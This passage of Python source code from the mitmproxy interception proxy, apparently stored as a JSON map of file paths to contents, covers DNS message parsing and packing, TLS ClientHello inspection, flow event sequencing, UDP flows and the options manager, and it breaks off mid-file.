base64.b64encode(ech_bytes).decode(\"utf-8\")\n        else:\n            return None\n\n    @https_ech.setter\n    def https_ech(self, ech: str | None) -> None:\n        record = https_records.unpack(self.data)\n        if ech is None:\n            record.params.pop(SVCParamKeys.ECH.value, None)\n        else:\n            ech_bytes = base64.b64decode(ech.encode(\"utf-8\"))\n            record.params[SVCParamKeys.ECH.value] = ech_bytes\n        self.data = https_records.pack(record)\n\n    def to_json(self) -> dict:\n        \"\"\"\n        Converts the resource record into json for mitmweb.\n        Sync with web/src/flow.ts.\n        \"\"\"\n        return {\n            \"name\": self.name,\n            \"type\": types.to_str(self.type),\n            \"class\": classes.to_str(self.class_),\n            \"ttl\": self.ttl,\n            \"data\": str(self),\n        }\n\n    @classmethod\n    def A(cls, name: str, ip: IPv4Address, *, ttl: int = DEFAULT_TTL) -> ResourceRecord:\n        \"\"\"Create an IPv4 resource record.\"\"\"\n        return cls(name, types.A, classes.IN, ttl, ip.packed)\n\n    @classmethod\n    def AAAA(\n        cls, name: str, ip: IPv6Address, *, ttl: int = DEFAULT_TTL\n    ) -> ResourceRecord:\n        \"\"\"Create an IPv6 resource record.\"\"\"\n        return cls(name, types.AAAA, classes.IN, ttl, ip.packed)\n\n    @classmethod\n    def CNAME(\n        cls, alias: str, canonical: str, *, ttl: int = DEFAULT_TTL\n    ) -> ResourceRecord:\n        \"\"\"Create a canonical internet name resource record.\"\"\"\n        return cls(alias, types.CNAME, classes.IN, ttl, domain_names.pack(canonical))\n\n    @classmethod\n    def PTR(cls, inaddr: str, ptr: str, *, ttl: int = DEFAULT_TTL) -> ResourceRecord:\n        \"\"\"Create a canonical internet name resource record.\"\"\"\n        return cls(inaddr, types.PTR, classes.IN, ttl, domain_names.pack(ptr))\n\n    @classmethod\n    def TXT(cls, name: str, text: str, *, ttl: int = DEFAULT_TTL) -> ResourceRecord:\n        \"\"\"Create a textual resource record.\"\"\"\n        return cls(name, types.TXT, classes.IN, ttl, text.encode(\"utf-8\"))\n\n    @classmethod\n    def HTTPS(\n        cls, name: str, record: HTTPSRecord, ttl: int = DEFAULT_TTL\n    ) -> ResourceRecord:\n        \"\"\"Create a HTTPS resource record\"\"\"\n        return cls(name, types.HTTPS, classes.IN, ttl, https_records.pack(record))\n\n\n# comments are taken from rfc1035\n@dataclass\nclass Message(serializable.SerializableDataclass):\n    HEADER: ClassVar[struct.Struct] = struct.Struct(\"!HHHHHH\")\n\n    timestamp: float\n    \"\"\"The time at which the message was sent or received.\"\"\"\n    id: int\n    \"\"\"An identifier assigned by the program that generates any kind of query.\"\"\"\n    query: bool\n    \"\"\"A field that specifies whether this message is a query.\"\"\"\n    op_code: int\n    \"\"\"\n    A field that specifies kind of query in this message.\n    This value is set by the originator of a request and copied into the response.\n    \"\"\"\n    authoritative_answer: bool\n    \"\"\"\n    This field is valid in responses, and specifies that the responding name server\n    is an authority for the domain name in question section.\n    \"\"\"\n    truncation: bool\n    \"\"\"Specifies that this message was truncated due to length greater than that permitted on the transmission channel.\"\"\"\n    recursion_desired: bool\n    \"\"\"\n    This field may be set in a query and is copied into the response.\n    If set, it directs the name server to pursue the query recursively.\n    \"\"\"\n    recursion_available: bool\n    \"\"\"This field is set or cleared in a response, and denotes whether recursive query support is available in the name server.\"\"\"\n    reserved: int\n    \"\"\"Reserved for future use.  Must be zero in all queries and responses.\"\"\"\n    response_code: int\n    \"\"\"This field is set as part of responses.\"\"\"\n    questions: list[Question]\n    \"\"\"\n    The question section is used to carry the \"question\" in most queries, i.e.\n    the parameters that define what is being asked.\n    \"\"\"\n    answers: list[ResourceRecord]\n    \"\"\"First resource record section.\"\"\"\n    authorities: list[ResourceRecord]\n    \"\"\"Second resource record section.\"\"\"\n    additionals: list[ResourceRecord]\n    \"\"\"Third resource record section.\"\"\"\n\n    def __str__(self) -> str:\n        return \"\\r\\n\".join(\n            map(\n                str,\n                itertools.chain(\n                    self.questions, self.answers, self.authorities, self.additionals\n                ),\n            )\n        )\n\n    @property\n    def content(self) -> bytes:\n        \"\"\"Returns the user-friendly content of all parts as encoded bytes.\"\"\"\n        return str(self).encode()\n\n    @property\n    def size(self) -> int:\n        \"\"\"Returns the cumulative data size of all resource record sections.\"\"\"\n        return sum(\n            len(x.data)\n            for x in itertools.chain.from_iterable(\n                [self.answers, self.authorities, self.additionals]\n            )\n        )\n\n    def fail(self, response_code: int) -> Message:\n        if response_code == response_codes.NOERROR:\n            raise ValueError(\"response_code must be an error code.\")\n        return Message(\n            timestamp=time.time(),\n            id=self.id,\n            query=False,\n            op_code=self.op_code,\n            authoritative_answer=False,\n            truncation=False,\n            recursion_desired=self.recursion_desired,\n            recursion_available=False,\n            reserved=0,\n            response_code=response_code,\n            questions=self.questions,\n            answers=[],\n            authorities=[],\n            additionals=[],\n        )\n\n    def succeed(self, answers: list[ResourceRecord]) -> Message:\n        return Message(\n            timestamp=time.time(),\n            id=self.id,\n            query=False,\n            op_code=self.op_code,\n            authoritative_answer=False,\n            truncation=False,\n            recursion_desired=self.recursion_desired,\n            recursion_available=True,\n            reserved=0,\n            response_code=response_codes.NOERROR,\n            questions=self.questions,\n            answers=answers,\n            authorities=[],\n            additionals=[],\n        )\n\n    @classmethod\n    def unpack(cls, buffer: bytes) -> Message:\n        \"\"\"Converts the entire given buffer into a DNS message.\"\"\"\n        length, msg = cls.unpack_from(buffer, 0)\n        if length != len(buffer):\n            raise struct.error(f\"unpack requires a buffer of {length} bytes\")\n        return msg\n\n    @classmethod\n    def unpack_from(cls, buffer: bytes | bytearray, offset: int) -> tuple[int, Message]:\n        \"\"\"Converts the buffer from a given offset into a DNS message and also returns its length.\"\"\"\n        (\n            id,\n            flags,\n            len_questions,\n            len_answers,\n            len_authorities,\n            len_additionals,\n        ) = Message.HEADER.unpack_from(buffer, offset)\n        msg = Message(\n            timestamp=time.time(),\n            id=id,\n            query=(flags & (1 << 15)) == 0,\n            op_code=(flags >> 11) & 0b1111,\n            authoritative_answer=(flags & (1 << 10)) != 0,\n            truncation=(flags & (1 << 9)) != 0,\n            recursion_desired=(flags & (1 << 8)) != 0,\n            recursion_available=(flags & (1 << 7)) != 0,\n            reserved=(flags >> 4) & 0b111,\n            response_code=flags & 0b1111,\n            questions=[],\n            answers=[],\n            authorities=[],\n            additionals=[],\n        )\n        offset += Message.HEADER.size\n        cached_names = domain_names.cache()\n\n        def unpack_domain_name() -> str:\n            nonlocal buffer, offset, cached_names\n            name, length = domain_names.unpack_from_with_compression(\n                buffer, offset, cached_names\n            )\n            offset += length\n            return name\n\n        for i in range(0, len_questions):\n            try:\n                name = unpack_domain_name()\n                type, class_ = Question.HEADER.unpack_from(buffer, offset)\n                offset += Question.HEADER.size\n                msg.questions.append(Question(name=name, type=type, class_=class_))\n            except struct.error as e:\n                raise struct.error(f\"question #{i}: {str(e)}\")\n\n        def unpack_rrs(\n            section: list[ResourceRecord], section_name: str, count: int\n        ) -> None:\n            nonlocal buffer, offset\n            for i in range(0, count):\n                try:\n                    name = unpack_domain_name()\n                    type, class_, ttl, len_data = ResourceRecord.HEADER.unpack_from(\n                        buffer, offset\n                    )\n                    offset += ResourceRecord.HEADER.size\n                    end_data = offset + len_data\n                    if len(buffer) < end_data:\n                        raise struct.error(\n                            f\"unpack requires a data buffer of {len_data} bytes\"\n                        )\n                    data = buffer[offset:end_data]\n                    if 0b11000000 in data:\n                        # the resource record might contains a compressed domain name, if so, uncompressed in advance\n                        try:\n                            (\n                                rr_name,\n                                rr_name_len,\n                            ) = domain_names.unpack_from_with_compression(\n                                buffer, offset, cached_names\n                            )\n                            if rr_name_len == len_data:\n                                data = domain_names.pack(rr_name)\n                        except struct.error:\n                            pass\n                    section.append(ResourceRecord(name, type, class_, ttl, data))\n                    offset += len_data\n                except struct.error as e:\n                    raise struct.error(f\"{section_name} #{i}: {str(e)}\")\n\n        unpack_rrs(msg.answers, \"answer\", len_answers)\n        unpack_rrs(msg.authorities, \"authority\", len_authorities)\n        unpack_rrs(msg.additionals, \"additional\", len_additionals)\n        return (offset, msg)\n\n    @property\n    def packed(self) -> bytes:\n        \"\"\"Converts the message into network bytes.\"\"\"\n        if self.id < 0 or self.id > 65535:\n            raise ValueError(f\"DNS message's id {self.id} is out of bounds.\")\n        flags = 0\n        if not self.query:\n            flags |= 1 << 15\n        if self.op_code < 0 or self.op_code > 0b1111:\n            raise ValueError(f\"DNS message's op_code {self.op_code} is out of bounds.\")\n        flags |= self.op_code << 11\n        if self.authoritative_answer:\n            flags |= 1 << 10\n        if self.truncation:\n            flags |= 1 << 9\n        if self.recursion_desired:\n            flags |= 1 << 8\n        if self.recursion_available:\n            flags |= 1 << 7\n        if self.reserved < 0 or self.reserved > 0b111:\n            raise ValueError(\n                f\"DNS message's reserved value of {self.reserved} is out of bounds.\"\n            )\n        flags |= self.reserved << 4\n        if self.response_code < 0 or self.response_code > 0b1111:\n            raise ValueError(\n                f\"DNS message's response_code {self.response_code} is out of bounds.\"\n            )\n        flags |= self.response_code\n        data = bytearray()\n        data.extend(\n            Message.HEADER.pack(\n                self.id,\n                flags,\n                len(self.questions),\n                len(self.answers),\n                len(self.authorities),\n                len(self.additionals),\n            )\n        )\n        # TODO implement compression\n        for question in self.questions:\n            data.extend(domain_names.pack(question.name))\n            data.extend(Question.HEADER.pack(question.type, question.class_))\n        for rr in (*self.answers, *self.authorities, *self.additionals):\n            data.extend(domain_names.pack(rr.name))\n            data.extend(\n                ResourceRecord.HEADER.pack(rr.type, rr.class_, rr.ttl, len(rr.data))\n            )\n            data.extend(rr.data)\n        return bytes(data)\n\n    def to_json(self) -> dict:\n        \"\"\"\n        Converts the message into json for mitmweb.\n        Sync with web/src/flow.ts.\n        \"\"\"\n        return {\n            \"id\": self.id,\n            \"query\": self.query,\n            \"op_code\": op_codes.to_str(self.op_code),\n            \"authoritative_answer\": self.authoritative_answer,\n            \"truncation\": self.truncation,\n            \"recursion_desired\": self.recursion_desired,\n            \"recursion_available\": self.recursion_available,\n            \"response_code\": response_codes.to_str(self.response_code),\n            \"status_code\": response_codes.http_equiv_status_code(self.response_code),\n            \"questions\": [question.to_json() for question in self.questions],\n            \"answers\": [rr.to_json() for rr in self.answers],\n            \"authorities\": [rr.to_json() for rr in self.authorities],\n            \"additionals\": [rr.to_json() for rr in self.additionals],\n            \"size\": self.size,\n            \"timestamp\": self.timestamp,\n        }\n\n    def copy(self) -> Message:\n        # we keep the copy semantics but change the ID generation\n        state = self.get_state()\n        state[\"id\"] = random.randint(0, 65535)\n        return Message.from_state(state)\n\n\nclass DNSFlow(flow.Flow):\n    \"\"\"A DNSFlow is a collection of DNS messages representing a single DNS query.\"\"\"\n\n    request: Message\n    \"\"\"The DNS request.\"\"\"\n    response: Message | None = None\n    \"\"\"The DNS response.\"\"\"\n\n    def get_state(self) -> serializable.State:\n        return {\n            **super().get_state(),\n            \"request\": self.request.get_state(),\n            \"response\": self.response.get_state() if self.response else None,\n        }\n\n    def set_state(self, state: serializable.State) -> None:\n        self.request = Message.from_state(state.pop(\"request\"))\n        self.response = Message.from_state(r) if (r := state.pop(\"response\")) else None\n        super().set_state(state)\n\n    def __repr__(self) -> str:\n        return f\"<DNSFlow\\r\\n  request={repr(self.request)}\\r\\n  response={repr(self.response)}\\r\\n>\"\n", "mitmproxy/tls.py": "import io\nfrom dataclasses import dataclass\n\nfrom kaitaistruct import KaitaiStream\nfrom OpenSSL import SSL\n\nfrom mitmproxy import connection\nfrom mitmproxy.contrib.kaitaistruct import dtls_client_hello\nfrom mitmproxy.contrib.kaitaistruct import tls_client_hello\nfrom mitmproxy.net import check\nfrom mitmproxy.proxy import context\n\n\nclass ClientHello:\n    \"\"\"\n    A TLS ClientHello is the first message sent by the client when initiating TLS.\n    \"\"\"\n\n    _raw_bytes: bytes\n\n    def __init__(self, raw_client_hello: bytes, dtls: bool = False):\n        \"\"\"Create a TLS ClientHello object from raw bytes.\"\"\"\n        self._raw_bytes = raw_client_hello\n        if dtls:\n            self._client_hello = dtls_client_hello.DtlsClientHello(\n                KaitaiStream(io.BytesIO(raw_client_hello))\n            )\n        else:\n            self._client_hello = tls_client_hello.TlsClientHello(\n                KaitaiStream(io.BytesIO(raw_client_hello))\n            )\n\n    def raw_bytes(self, wrap_in_record: bool = True) -> bytes:\n        \"\"\"\n        The raw ClientHello bytes as seen on the wire.\n\n        If `wrap_in_record` is True, the ClientHello will be wrapped in a synthetic TLS record\n        (`0x160303 + len(chm) + 0x01 + len(ch)`), which is the format expected by some tools.\n        The synthetic record assumes TLS version (`0x0303`), which may be different from what has been sent over the\n        wire. JA3 hashes are unaffected by this as they only use the TLS version from the ClientHello data structure.\n\n        A future implementation may return not just the exact ClientHello, but also the exact record(s) as seen on the\n        wire.\n        \"\"\"\n        if isinstance(self._client_hello, dtls_client_hello.DtlsClientHello):\n            raise NotImplementedError\n\n        if wrap_in_record:\n            return (\n                # record layer\n                b\"\\x16\\x03\\x03\"\n                + (len(self._raw_bytes) + 4).to_bytes(2, byteorder=\"big\")\n                +\n                # handshake header\n                b\"\\x01\"\n                + len(self._raw_bytes).to_bytes(3, byteorder=\"big\")\n                +\n                # ClientHello as defined in https://datatracker.ietf.org/doc/html/rfc8446#section-4.1.2.\n                self._raw_bytes\n            )\n        else:\n            return self._raw_bytes\n\n    @property\n    def cipher_suites(self) -> list[int]:\n        \"\"\"The cipher suites offered by the client (as raw ints).\"\"\"\n        return self._client_hello.cipher_suites.cipher_suites\n\n    @property\n    def sni(self) -> str | None:\n        \"\"\"\n        The [Server Name Indication](https://en.wikipedia.org/wiki/Server_Name_Indication),\n        which indicates which hostname the client wants to connect to.\n        \"\"\"\n        if ext := getattr(self._client_hello, \"extensions\", None):\n            for extension in ext.extensions:\n                is_valid_sni_extension = (\n                    extension.type == 0x00\n                    and len(extension.body.server_names) == 1\n                    and extension.body.server_names[0].name_type == 0\n                    and check.is_valid_host(extension.body.server_names[0].host_name)\n                )\n                if is_valid_sni_extension:\n                    return extension.body.server_names[0].host_name.decode(\"ascii\")\n        return None\n\n    @property\n    def alpn_protocols(self) -> list[bytes]:\n        \"\"\"\n        The application layer protocols offered by the client as part of the\n        [ALPN](https://en.wikipedia.org/wiki/Application-Layer_Protocol_Negotiation) TLS extension.\n        \"\"\"\n        if ext := getattr(self._client_hello, \"extensions\", None):\n            for extension in ext.extensions:\n                if extension.type == 0x10:\n                    return list(x.name for x in extension.body.alpn_protocols)\n        return []\n\n    @property\n    def extensions(self) -> list[tuple[int, bytes]]:\n        \"\"\"The raw list of extensions in the form of `(extension_type, raw_bytes)` tuples.\"\"\"\n        ret = []\n        if ext := getattr(self._client_hello, \"extensions\", None):\n            for extension in ext.extensions:\n                body = getattr(extension, \"_raw_body\", extension.body)\n                ret.append((extension.type, body))\n        return ret\n\n    def __repr__(self):\n        return f\"ClientHello(sni: {self.sni}, alpn_protocols: {self.alpn_protocols})\"\n\n\n@dataclass\nclass ClientHelloData:\n    \"\"\"\n    Event data for `tls_clienthello` event hooks.\n    \"\"\"\n\n    context: context.Context\n    \"\"\"The context object for this connection.\"\"\"\n    client_hello: ClientHello\n    \"\"\"The entire parsed TLS ClientHello.\"\"\"\n    ignore_connection: bool = False\n    \"\"\"\n    If set to `True`, do not intercept this connection and forward encrypted contents unmodified.\n    \"\"\"\n    establish_server_tls_first: bool = False\n    \"\"\"\n    If set to `True`, pause this handshake and establish TLS with an upstream server first.\n    This makes it possible to process the server certificate when generating an interception certificate.\n    \"\"\"\n\n\n@dataclass\nclass TlsData:\n    \"\"\"\n    Event data for `tls_start_client`, `tls_start_server`, and `tls_handshake` event hooks.\n    \"\"\"\n\n    conn: connection.Connection\n    \"\"\"The affected connection.\"\"\"\n    context: context.Context\n    \"\"\"The context object for this connection.\"\"\"\n    ssl_conn: SSL.Connection | None = None\n    \"\"\"\n    The associated pyOpenSSL `SSL.Connection` object.\n    This will be set by an addon in the `tls_start_*` event hooks.\n    \"\"\"\n    is_dtls: bool = False\n    \"\"\"\n    If set to `True`, indicates that it is a DTLS event.\n    \"\"\"\n", "mitmproxy/eventsequence.py": "from collections.abc import Callable\nfrom collections.abc import Iterator\nfrom typing import Any\n\nfrom mitmproxy import dns\nfrom mitmproxy import flow\nfrom mitmproxy import hooks\nfrom mitmproxy import http\nfrom mitmproxy import tcp\nfrom mitmproxy import udp\nfrom mitmproxy.proxy import layers\n\nTEventGenerator = Iterator[hooks.Hook]\n\n\ndef _iterate_http(f: http.HTTPFlow) -> TEventGenerator:\n    if f.request:\n        yield layers.http.HttpRequestHeadersHook(f)\n        yield layers.http.HttpRequestHook(f)\n    if f.response:\n        yield layers.http.HttpResponseHeadersHook(f)\n        yield layers.http.HttpResponseHook(f)\n    if f.websocket:\n        message_queue = f.websocket.messages\n        f.websocket.messages = []\n        yield layers.websocket.WebsocketStartHook(f)\n        for m in message_queue:\n            f.websocket.messages.append(m)\n            yield layers.websocket.WebsocketMessageHook(f)\n        yield layers.websocket.WebsocketEndHook(f)\n    elif f.error:\n        yield layers.http.HttpErrorHook(f)\n\n\ndef _iterate_tcp(f: tcp.TCPFlow) -> TEventGenerator:\n    messages = f.messages\n    f.messages = []\n    yield layers.tcp.TcpStartHook(f)\n    while messages:\n        f.messages.append(messages.pop(0))\n        yield layers.tcp.TcpMessageHook(f)\n    if f.error:\n        yield layers.tcp.TcpErrorHook(f)\n    else:\n        yield layers.tcp.TcpEndHook(f)\n\n\ndef _iterate_udp(f: udp.UDPFlow) -> TEventGenerator:\n    messages = f.messages\n    f.messages = []\n    yield layers.udp.UdpStartHook(f)\n    while messages:\n        f.messages.append(messages.pop(0))\n        yield layers.udp.UdpMessageHook(f)\n    if f.error:\n        yield layers.udp.UdpErrorHook(f)\n    else:\n        yield layers.udp.UdpEndHook(f)\n\n\ndef _iterate_dns(f: dns.DNSFlow) -> TEventGenerator:\n    if f.request:\n        yield layers.dns.DnsRequestHook(f)\n    if f.response:\n        yield layers.dns.DnsResponseHook(f)\n    if f.error:\n        yield layers.dns.DnsErrorHook(f)\n\n\n_iterate_map: dict[type[flow.Flow], Callable[[Any], TEventGenerator]] = {\n    http.HTTPFlow: _iterate_http,\n    tcp.TCPFlow: _iterate_tcp,\n    udp.UDPFlow: _iterate_udp,\n    dns.DNSFlow: _iterate_dns,\n}\n\n\ndef iterate(f: flow.Flow) -> TEventGenerator:\n    try:\n        e = _iterate_map[type(f)]\n    except KeyError as err:\n        raise TypeError(f\"Unknown flow type: {f.__class__.__name__}\") from err\n    else:\n        yield from e(f)\n", "mitmproxy/udp.py": "import time\n\nfrom mitmproxy import connection\nfrom mitmproxy import flow\nfrom mitmproxy.coretypes import serializable\n\n\nclass UDPMessage(serializable.Serializable):\n    \"\"\"\n    An individual UDP datagram.\n    \"\"\"\n\n    def __init__(self, from_client, content, timestamp=None):\n        self.from_client = from_client\n        self.content = content\n        self.timestamp = timestamp or time.time()\n\n    @classmethod\n    def from_state(cls, state):\n        return cls(*state)\n\n    def get_state(self):\n        return self.from_client, self.content, self.timestamp\n\n    def set_state(self, state):\n        self.from_client, self.content, self.timestamp = state\n\n    def __repr__(self):\n        return \"{direction} {content}\".format(\n            direction=\"->\" if self.from_client else \"<-\", content=repr(self.content)\n        )\n\n\nclass UDPFlow(flow.Flow):\n    \"\"\"\n    A UDPFlow is a representation of a UDP session.\n    \"\"\"\n\n    messages: list[UDPMessage]\n    \"\"\"\n    The messages transmitted over this connection.\n\n    The latest message can be accessed as `flow.messages[-1]` in event hooks.\n    \"\"\"\n\n    def __init__(\n        self,\n        client_conn: connection.Client,\n        server_conn: connection.Server,\n        live: bool = False,\n    ):\n        super().__init__(client_conn, server_conn, live)\n        self.messages = []\n\n    def get_state(self) -> serializable.State:\n        return {\n            **super().get_state(),\n            \"messages\": [m.get_state() for m in self.messages],\n        }\n\n    def set_state(self, state: serializable.State) -> None:\n        self.messages = [UDPMessage.from_state(m) for m in state.pop(\"messages\")]\n        super().set_state(state)\n\n    def __repr__(self):\n        return f\"<UDPFlow ({len(self.messages)} messages)>\"\n\n\n__all__ = [\n    \"UDPFlow\",\n    \"UDPMessage\",\n]\n", "mitmproxy/optmanager.py": "from __future__ import annotations\n\nimport contextlib\nimport copy\nimport pprint\nimport textwrap\nimport weakref\nfrom collections.abc import Callable\nfrom collections.abc import Iterable\nfrom collections.abc import Sequence\nfrom dataclasses import dataclass\nfrom pathlib import Path\nfrom typing import Any\nfrom typing import Optional\nfrom typing import TextIO\n\nimport ruamel.yaml\n\nfrom mitmproxy import exceptions\nfrom mitmproxy.utils import signals\nfrom mitmproxy.utils import typecheck\n\n\"\"\"\n    The base implementation for Options.\n\"\"\"\n\nunset = object()\n\n\nclass _Option:\n    __slots__ = (\"name\", \"typespec\", \"value\", \"_default\", \"choices\", \"help\")\n\n    def __init__(\n        self,\n        name: str,\n        typespec: type | object,  # object for Optional[x], which is not a type.\n        default: Any,\n        help: str,\n        choices: Sequence[str] | None,\n    ) -> None:\n        typecheck.check_option_type(name, default, typespec)\n        self.name = name\n        self.typespec = typespec\n        self._default = default\n        self.value = unset\n        self.help = textwrap.dedent(help).strip().replace(\"\\n\", \" \")\n        self.choices = choices\n\n    def __repr__(self):\n        return f\"{self.current()} [{self.typespec}]\"\n\n    @property\n    def default(self):\n        return copy.deepcopy(self._default)\n\n    def current(self) -> Any:\n        if self.value is unset:\n            v = self.default\n        else:\n            v = self.value\n        return copy.deepcopy(v)\n\n    def set(self, value: Any) -> None:\n        typecheck.check_option_type(self.name, value, self.typespec)\n        self.value = value\n\n    def reset(self) -> None:\n        self.value = unset\n\n    def has_changed(self) -> bool:\n        return self.current() != self.default\n\n    def __eq__(self, other) -> bool:\n        for i in self.__slots__:\n            if getattr(self, i) != getattr(other, i):\n                return False\n        return True\n\n    def __deepcopy__(self, _):\n        o = _Option(self.name, self.typespec, self.default, self.help, self.choices)\n        if self.has_changed():\n            o.value = self.current()\n        return o\n\n\n@dataclass\nclass _UnconvertedStrings:\n    val: list[str]\n\n\ndef _sig_changed_spec(updated: set[str]) -> None:  # pragma: no cover\n    ...  # expected function signature for OptManager.changed receivers.\n\n\ndef _sig_errored_spec(exc: Exception) -> None:  # pragma: no cover\n    ...  # expected function signature for OptManager.errored receivers.\n\n\nclass OptManager:\n    \"\"\"\n    OptManager is the base class from which Options objects are derived.\n\n    .changed is a Signal that triggers whenever options are\n    updated. If any handler in the chain raises an exceptions.OptionsError\n    exception, all changes are rolled back, the exception is suppressed,\n    and the .errored signal is notified.\n\n    Optmanager always returns a deep copy of options to ensure that\n    mutation doesn't change the option state inadvertently.\n    \"\"\"\n\n    def __init__(self) -> None:\n        self.deferred: dict[str, Any] = {}\n        self.changed = signals.SyncSignal(_sig_changed_spec)\n        self.changed.connect(self._notify_subscribers)\n        self.errored = signals.SyncSignal(_sig_errored_spec)\n        self._subscriptions: list[tuple[weakref.ref[Callable], set[str]]] = []\n        # Options must be the last attribute here - after that, we raise an\n        # error for attribute assignment to unknown options.\n        self._options: dict[str, Any] = {}\n\n    def add_option(\n        self,\n        name: str,\n        typespec: type | object,\n        default: Any,\n        help: str,\n        choices: Sequence[str] | None = None,\n    ) -> None:\n        self._options[name] = _Option(name, typespec, default, help, choices)\n        self.changed.send(updated={name})\n\n    @contextlib.contextmanager\n    def rollback(self, updated, reraise=False):\n        old = copy.deepcopy(self._options)\n        try:\n            yield\n        except exceptions.OptionsError as e:\n            # Notify error handlers\n            self.errored.send(exc=e)\n            # Rollback\n            self.__dict__[\"_options\"] = old\n            self.changed.send(updated=updated)\n            if reraise:\n                raise e\n\n    def subscribe(self, func, opts):\n        \"\"\"\n        Subscribe a callable to the .changed signal, but only for a\n        specified list of options. The callable should accept arguments\n        (options, updated), and may raise an OptionsError.\n\n        The event will automatically be unsubscribed if the callable goes out of scope.\n        \"\"\"\n        for i in opts:\n            if i not in self._options:\n                raise exceptions.OptionsError(\"No such option: %s\" % i)\n\n        self._subscriptions.append((signals.make_weak_ref(func), set(opts)))\n\n    def _notify_subscribers(self, updated) -> None:\n        cleanup = False\n        for ref, opts in self._subscriptions:\n            callback = ref()\n            if callback is not None:\n                if opts & updated:\n                    callback(self, updated)\n            else:\n                cleanup = True\n\n        if cleanup:\n            self.__dict__[\"_subscriptions\"] = [\n                (ref, opts) for (ref, opts) in self._subscriptions if ref() is not None\n            ]\n\n    def __eq__(self, other):\n        if isinstance(other, OptManager):\n            return self._options == other._options\n        return False\n\n    def __deepcopy__(self, memodict=None):\n        o = OptManager()\n        o.__dict__[\"_options\"] = copy.deepcopy(self._options, memodict)\n        return o\n\n    __copy__ = __deepcopy__\n\n    def __getattr__(self, attr):\n        if attr in self._options:\n            return self._options[attr].current()\n        else:\n            raise AttributeError(\"No such option: %s\" % attr)\n\n    def __setattr__(self, attr, value):\n        # This is slightly tricky. We allow attributes to be set on the instance\n        # until we have an _options attribute. After that, assignment is sent to\n        # the update function, and will raise an error for unknown options.\n        opts = self.__dict__.get(\"_options\")\n        if not opts:\n            super().__setattr__(attr, value)\n        else:\n            self.update(**{attr: value})\n\n    def keys(self):\n        return set(self._options.keys())\n\n    def items(self):\n        return self._options.items()\n\n    def __contains__(self, k):\n        return k in self._options\n\n    def reset(self):\n        \"\"\"\n        Restore defaults for all options.\n        \"\"\"\n        for o in self._options.values():\n            o.reset()\n        self.changed.send(updated=set(self._options.keys()))\n\n    def update_known(self, **kwargs):\n        \"\"\"\n        Update and set all known options from kwargs. Returns a dictionary\n        of unknown options.\n        \"\"\"\n        known, unknown = {}, {}\n        for k, v in kwargs.items():\n            if k in self._options:\n                known[k] = v\n            else:\n                unknown[k] = v\n        updated = set(known.keys())\n        if updated:\n            with self.rollback(updated, reraise=True):\n                for k, v in known.items():\n                    self._options[k].set(v)\n                self.changed.send(updated=updated)\n        return unknown\n\n    def update_defer(self, **kwargs):\n        unknown = self.update_known(**kwargs)\n        self.deferred.update(unknown)\n\n    def update(self, **kwargs):\n        u = self.update_known(**kwargs)\n        if u:\n            raise KeyError(\"Unknown options: %s\" % \", \".join(u.keys()))\n\n    def setter(self, attr):\n        \"\"\"\n        Generate a setter for a given attribute. This returns a callable\n        taking a single argument.\n        \"\"\"\n        if attr not in self._options:\n            raise KeyError(\"No such option: %s\" % attr)\n\n        def setter(x):\n            setattr(self, attr, x)\n\n        return setter\n\n    def toggler(self, attr):\n        \"\"\"\n        Generate a toggler for a boolean attribute. This returns a callable\n        that takes no arguments.\n        \"\"\"\n        if attr not in self._options:\n            raise KeyError(\"No such option: %s\" % attr)\n        o = self._options[attr]\n        if o.typespec != bool:\n            raise ValueError(\"Toggler can only be used with boolean options\")\n\n        def toggle():\n            setattr(self, attr, not getattr(self, attr))\n\n        return toggle\n\n    def default(self, option: str) -> Any:\n        return self._options[option].default\n\n    def has_changed(self, option):\n        \"\"\"\n        Has the option changed from the default?\n        \"\"\"\n        return self._options[option].has_changed()\n\n    def merge(self, opts):\n        \"\"\"\n        Merge a dict of options into this object. Options that have None\n        value are ignored. Lists and tuples are appended to the current\n        option value.\n        \"\"\"\n        toset = {}\n        for k, v in opts.items():\n            if v is not None:\n                if isinstance(v, (list, tuple)):\n                    toset[k] = getattr(self, k) + v\n                else:\n                    toset[k] = v\n        self.update(**toset)\n\n    def __repr__(self):\n        options = pprint.pformat(self._options, indent=4).strip(\" {}\")\n        if \"\\n\" in options:\n            options = \"\\n    \" + options + \"\\n\"\n        return \"{mod}.{cls}({{{options}}})\".format(\n            mod=type(self).__module__, cls=type(self).__name__, options=options\n        )\n\n    def set(self, *specs: str, defer: bool = False) -> None:\n        \"\"\"\n        Takes a list of set specification in standard form (option=value).\n        Options that are known are updated immediately. If defer is true,\n        options that are not known are deferred, and will be set once they\n        are added.\n\n        May raise an `OptionsError` if a value is malformed or an option is unknown and defer is False.\n        \"\"\"\n        # First, group specs by option name.\n        unprocessed: dict[str, list[str]] = {}\n        for spec in specs:\n            if \"=\" in spec:\n                name, value = spec.split(\"=\", maxsplit=1)\n                unprocessed.setdefault(name, []).append(value)\n            else:\n                unprocessed.setdefault(spec, [])\n\n        # Second, convert values to the correct type.\n        processed: dict[str, Any] = {}\n        for name in list(unprocessed.keys()):\n            if name in self._options:\n                processed[name] = self._parse_setval(\n                    self._options[name], unprocessed.pop(name)\n                )\n\n        # Third, stash away unrecognized options or complain about them.\n        if defer:\n            self.deferred.update(\n                {k: _UnconvertedStrings(v) for k, v in unprocessed.items()}\n            )\n        elif unprocessed:\n            raise exceptions.OptionsError(\n                f\"Unknown option(s): {', '.join(unprocessed)}\"\n            )\n\n        # Finally, apply updated options.\n        self.update(**processed)\n\n    def process_deferred(self) -> None:\n        \"\"\"\n        Processes options that were deferred in previous calls to set, and\n        have since been added.\n        \"\"\"\n        update: dict[str, Any] = {}\n        for optname, value in self.deferred.items():\n            if optname in self._options:\n                if isinstance(value, _UnconvertedStrings):\n                    value = self._parse_setval(self._options[optname], value.val)\n                update[optname] = value\n        self.update(**update)\n        for k in update.keys():\n            del self.deferred[k]\n\n    def _parse_setval(self, o: _Option, values: list[str]) -> Any:\n        \"\"\"\n        Convert a string to a value appropriate for the option type.\n        \"\"\"\n        if o.typespec == Sequence[str]:\n            return values\n        if len(values) > 1:\n            raise exceptions.OptionsError(\n                f\"Received multiple values for {o.name}: {values}\"\n            )\n\n        optstr: str | None\n        if values:\n            optstr = values[0]\n        else:\n            optstr = None\n\n        if o.typespec in (str, Optional[str]):\n            if o.typespec == str and optstr is None:\n                raise exceptions.OptionsError(f\"Option is required: {o.name}\")\n            return optstr\n        elif o.typespec in (int, Optional[int]):\n            if optstr:\n                try:\n                    return int(optstr)\n                except ValueError:\n                    raise exceptions.OptionsError(f\"Not an integer: {optstr}\")\n            elif o.typespec == int:\n                raise exceptions.OptionsError(f\"Option is required: 